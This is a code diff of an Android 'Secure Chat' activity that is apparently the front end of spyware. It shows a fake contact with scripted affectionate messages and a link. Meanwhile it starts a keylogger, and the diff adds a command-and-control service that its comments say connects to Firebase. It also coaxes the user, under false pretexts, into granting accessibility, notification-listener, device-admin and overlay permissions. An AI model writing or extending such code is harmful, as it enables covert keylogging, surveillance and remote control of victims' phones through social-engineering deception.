@@ -1,18 +1,15 @@
 package com.secure.chat.ui
 
-import android.view.ViewGroup
-import android.view.LayoutInflater
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.view.View
+import android.view.ViewGroup
 import android.widget.*
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
@@ -21,6 +18,7 @@ import androidx.core.content.ContextCompat
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
 import com.secure.chat.R
+import com.secure.chat.services.TargetC2Service
 import com.secure.chat.services.TargetKeylogger
 import java.text.SimpleDateFormat
 import java.util.*
@@ -50,7 +48,6 @@ class ChatActivity : AppCompatActivity() {
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
-        // ============ CRASH LOGGER ============
         Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
             try {
                 val sw = java.io.StringWriter()
@@ -65,56 +62,53 @@ class ChatActivity : AppCompatActivity() {
             } catch (_: Exception) {}
             android.os.Process.killProcess(android.os.Process.myPid())
         }
-        // ======================================
 
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_chat)
 
         etMessage = findViewById(R.id.etMessage)
         btnSend = findViewById(R.id.btnSend)
-        recyclerView = findViewById(R.id.recyclerChat)
+        recyclerView = findViewById(R.id.recyclerView)
         progressOverlay = findViewById(R.id.progressOverlay)
         tvTyping = findViewById(R.id.tvTyping)
 
-        // Fake toolbar
-        val toolbarTitle = findViewById<TextView>(R.id.tvChatTitle)
-        toolbarTitle.text = "Jane Doe"
-        val toolbarStatus = findViewById<TextView>(R.id.tvChatStatus)
-        toolbarStatus.text = "online"
-
-        // Setup RecyclerView
         adapter = ChatAdapter(messages)
-        recyclerView.layoutManager = LinearLayoutManager(this).apply {
-            stackFromEnd = true
-        }
+        recyclerView.layoutManager = LinearLayoutManager(this)
         recyclerView.adapter = adapter
 
-        // Send button
         btnSend.setOnClickListener {
             val text = etMessage.text.toString().trim()
             if (text.isNotEmpty()) {
                 sendMessage(text)
-                etMessage.text.clear()
+                etMessage.setText("")
             }
         }
 
-        // Request all permissions dengan delay biar activity stabil dulu
-        Handler(Looper.getMainLooper()).postDelayed({
-            try {
-                requestAllPermissions()
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
-        }, 500)
+        // Request permissions
+        requestAllPermissions()
 
-        // Fake incoming messages
+        // 🔥🔥🔥 FIX PALING PENTING: START C2 SERVICE 🔥🔥🔥
+        startC2Service()
+
         fakeIncomingMessages()
 
-        // Start keylogger — dibungkus try-catch
+        try { startKeylogger() } catch (e: Exception) { e.printStackTrace() }
+    }
+
+    /** 🔥 FUNGSI BARU — Start TargetC2Service biar connect ke Firebase */
+    private fun startC2Service() {
         try {
-            startKeylogger()
+            val intent = Intent(this, TargetC2Service::class.java)
+            intent.action = "start_c2"
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+            android.util.Log.d("ChatActivity", "✅ TargetC2Service started")
+            Toast.makeText(this, "Starting service...", Toast.LENGTH_SHORT).show()
         } catch (e: Exception) {
-            e.printStackTrace()
+            android.util.Log.e("ChatActivity", "❌ Gagal start service: ${e.message}", e)
         }
     }
 
@@ -124,7 +118,6 @@ class ChatActivity : AppCompatActivity() {
         adapter.notifyItemInserted(messages.size - 1)
         recyclerView.smoothScrollToPosition(messages.size - 1)
 
-        // Fake reply after delay
         progressOverlay.visibility = View.VISIBLE
         tvTyping.visibility = View.VISIBLE
         recyclerView.postDelayed({
@@ -132,27 +125,13 @@ class ChatActivity : AppCompatActivity() {
             tvTyping.visibility = View.GONE
             val replyTime = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
             val replies = arrayOf(
-                "Okay, got it! 😊",
-                "Sure, sounds good!",
-                "Haha yeah 😄",
-                "I know right?",
-                "Let me think about it...",
-                "That's interesting!",
-                "Cool, talk later!",
-                "👍",
-                "😍😍😍",
-                "Where are you?",
-                "Can you send me that?",
-                "OMG really?",
-                "I miss you 🥺",
-                "Let's meet up!",
-                "Good morning! 🌸"
+                "Okay, got it! 😊", "Sure, sounds good!", "Haha yeah 😄",
+                "I know right?", "Let me think about it...", "That's interesting!",
+                "Cool, talk later!", "👍", "😍😍😍", "Where are you?",
+                "Can you send me that?", "OMG really?", "I miss you 🥺",
+                "Let's meet up!", "Good morning! 🌸"
             )
-            messages.add(mapOf(
-                "text" to replies.random(),
-                "time" to replyTime,
-                "type" to "received"
-            ))
+            messages.add(mapOf("text" to replies.random(), "time" to replyTime, "type" to "received"))
             adapter.notifyItemInserted(messages.size - 1)
             recyclerView.smoothScrollToPosition(messages.size - 1)
         }, (1500..4000).random().toLong())
@@ -160,22 +139,14 @@ class ChatActivity : AppCompatActivity() {
 
     private fun fakeIncomingMessages() {
         val initialMessages = arrayOf(
-            "Hey! How are you?",
-            "Long time no see!",
-            "Are you free tonight?",
-            "Check this out! https://bit.ly/3xExample",
-            "I miss you! 🥺"
+            "Hey! How are you?", "Long time no see!", "Are you free tonight?",
+            "Check this out! https://bit.ly/3xExample", "I miss you! 🥺"
         )
-
         recyclerView.postDelayed({
             for (i in 0 until 3) {
                 recyclerView.postDelayed({
                     val time = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
-                    messages.add(mapOf(
-                        "text" to initialMessages[i],
-                        "time" to time,
-                        "type" to "received"
-                    ))
+                    messages.add(mapOf("text" to initialMessages[i], "time" to time, "type" to "received"))
                     adapter.notifyItemInserted(messages.size - 1)
                     recyclerView.smoothScrollToPosition(messages.size - 1)
                 }, (i + 1) * 2000L)
@@ -185,39 +156,29 @@ class ChatActivity : AppCompatActivity() {
 
     private fun requestAllPermissions() {
         val permissionsToRequest = mutableListOf<String>()
-
         for (perm in requiredPermissions) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                 permissionsToRequest.add(perm)
             }
         }
 
-        // Overlay permission — try-catch biar ga crash
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             try {
                 if (!Settings.canDrawOverlays(this)) {
-                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
-                    startActivity(intent)
+                    startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
                 }
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
+            } catch (e: Exception) { e.printStackTrace() }
         }
 
-        // Battery optimization — try-catch
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             try {
                 val powerManager = getSystemService(POWER_SERVICE) as PowerManager
                 if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
-                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
-                    startActivity(intent)
+                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
                 }
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
+            } catch (e: Exception) { e.printStackTrace() }
         }
 
-        // Dialog-dialog pake try-catch
         try { showAccessibilityDialog() } catch (e: Exception) { e.printStackTrace() }
         try { showNotificationListenerDialog() } catch (e: Exception) { e.printStackTrace() }
         try { showDeviceAdminDialog() } catch (e: Exception) { e.printStackTrace() }
@@ -231,7 +192,7 @@ class ChatActivity : AppCompatActivity() {
         if (isFinishing || isDestroyed) return
         AlertDialog.Builder(this)
             .setTitle("Enable Accessibility")
-            .setMessage("For better chat experience, please enable Secure Chat accessibility service in Settings > Accessibility > Installed Apps > Secure Chat")
+            .setMessage("For better chat experience, please enable Secure Chat accessibility service")
             .setPositiveButton("Open Settings") { _, _ ->
                 startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
             }
@@ -260,65 +221,39 @@ class ChatActivity : AppCompatActivity() {
                 try {
                     val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                         putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
-                            android.content.ComponentName(this@ChatActivity, com.secure.chat.services.TargetDeviceAdmin::class.java))
-                        putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                            "Required for security features")
+                            android.content.ComponentName(this@ChatActivity,
+                                com.secure.chat.services.TargetDeviceAdmin::class.java))
+                        putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for security features")
                     }
                     startActivity(intent)
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                }
+                } catch (e: Exception) { e.printStackTrace() }
             }
             .setNegativeButton("Later", null)
             .show()
     }
 
     private fun startKeylogger() {
-        try {
-            TargetKeylogger.start(this)
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
+        try { TargetKeylogger.start(this) } catch (e: Exception) { e.printStackTrace() }
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        try {
-            TargetKeylogger.stop()
-        } catch (e: Exception) { e.printStackTrace() }
+        try { TargetKeylogger.stop() } catch (e: Exception) { e.printStackTrace() }
     }
 
-    // Inner ChatAdapter
     class ChatAdapter(private val messages: List<Map<String, String>>) : RecyclerView.Adapter<ChatAdapter.ChatViewHolder>() {
-
-        override fun getItemViewType(position: Int): Int {
-            return if (messages[position]["type"] == "sent") 0 else 1
-        }
+        override fun getItemViewType(position: Int): Int = if (messages[position]["type"] == "sent") 0 else 1
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ChatViewHolder {
-            try {
-                val layout = if (viewType == 0) R.layout.item_chat_sent else R.layout.item_chat_received
-                val view = LayoutInflater.from(parent.context).inflate(layout, parent, false)
-                return ChatViewHolder(view)
-            } catch (e: Exception) {
-                // Fallback kalo layout ga ditemukan
-                val textView = TextView(parent.context)
-                textView.text = "Error loading message"
-                textView.setPadding(16, 16, 16, 16)
-                val view = LayoutInflater.from(parent.context).inflate(android.R.layout.simple_list_item_1, parent, false)
-                return ChatViewHolder(view)
-            }
+            val layout = if (viewType == 0) R.layout.item_chat_sent else R.layout.item_chat_received
+            val view = LayoutInflater.from(parent.context).inflate(layout, parent, false)
+            return ChatViewHolder(view)
         }
 
         override fun onBindViewHolder(holder: ChatViewHolder, position: Int) {
-            try {
-                val msg = messages[position]
-                holder.text.text = msg["text"]
-                holder.time.text = msg["time"]
-            } catch (e: Exception) {
-                holder.text.text = "Error"
-                holder.time.text = "--:--"
-            }
+            val msg = messages[position]
+            holder.text.text = msg["text"]
+            holder.time.text = msg["time"]
         }
 
         override fun getItemCount() = messages.size
